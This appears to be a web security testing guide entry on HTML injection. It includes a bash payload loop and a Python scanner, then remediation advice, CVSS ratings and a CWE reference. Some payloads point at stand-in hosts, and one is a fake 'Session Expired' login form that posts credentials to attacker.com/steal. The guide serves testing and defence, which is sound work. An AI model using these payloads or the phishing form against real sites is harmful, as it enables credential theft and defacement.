# WSTG-CLNT-03: Testing for HTML Injection

## Test ID
WSTG-CLNT-03

## Test Name
Testing for HTML Injection

## High-Level Description

HTML injection allows attackers to inject arbitrary HTML content into web pages. While not as severe as XSS (no script execution), it can be used for phishing, defacement, or to manipulate page content to trick users.

---

## What to Check

- [ ] Form fields reflected in page
- [ ] URL parameters in HTML
- [ ] Error messages with user input
- [ ] Search results display
- [ ] User profile content

---

## How to Test

### Step 1: Basic HTML Injection

```bash
#!/bin/bash
TARGET="https://target.com"

payloads=(
    "<h1>Injected</h1>"
    "<a href='https://evil.com'>Click here</a>"
    "<form action='https://evil.com'><input name='password'><input type='submit'></form>"
    "<img src='https://evil.com/logo.png'>"
    "<marquee>HTML Injection</marquee>"
)

for payload in "${payloads[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    response=$(curl -s "$TARGET/search?q=$encoded")

    if echo "$response" | grep -q "<h1>Injected\|<a href='\|<form action="; then
        echo "[VULN] HTML injection: $payload"
    fi
done
```

### Step 2: Phishing Form Injection

```html
<!-- Test injecting a fake login form -->
<form action="https://attacker.com/steal" method="POST">
    <h2>Session Expired - Please Re-login</h2>
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
```

### Step 3: HTML Injection Tester

```python
#!/usr/bin/env python3
import requests
import html

class HTMLInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_injection(self, endpoint, param):
        """Test for HTML injection"""
        print(f"[*] Testing HTML injection: {endpoint}?{param}")

        payloads = [
            ("<h1>TEST</h1>", "<h1>TEST</h1>"),
            ("<b>bold</b>", "<b>bold</b>"),
            ("<a href=x>link</a>", "<a href"),
            ("<img src=x>", "<img src"),
            ("<table><tr><td>cell</td></tr></table>", "<table>"),
        ]

        for payload, check in payloads:
            url = f"{self.base_url}{endpoint}"
            response = requests.get(url, params={param: payload})

            # Check if HTML is rendered (not encoded)
            if check in response.text and html.escape(check) not in response.text:
                print(f"[VULN] HTML injection with: {payload[:30]}")
                self.findings.append({
                    "endpoint": endpoint,
                    "parameter": param,
                    "payload": payload,
                    "severity": "Medium"
                })
                break

# Usage
tester = HTMLInjectionTester("https://target.com")
tester.test_injection("/search", "q")
tester.test_injection("/profile", "bio")
```

---

## Remediation

```python
# Always HTML encode user output
import html

user_input = "<h1>Malicious</h1>"
safe_output = html.escape(user_input)
# Result: &lt;h1&gt;Malicious&lt;/h1&gt;
```

```javascript
// JavaScript - use textContent instead of innerHTML
element.textContent = userInput;  // Safe
// NOT: element.innerHTML = userInput;  // Unsafe
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| HTML injection (phishing) | 4.3 | Medium |
| HTML injection (defacement) | 3.5 | Low |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-80** | Improper Neutralization of Script-Related HTML Tags |

---

## Checklist

```
[ ] Input fields tested
[ ] URL parameters tested
[ ] Error messages checked
[ ] HTML encoding verified
[ ] Findings documented
```
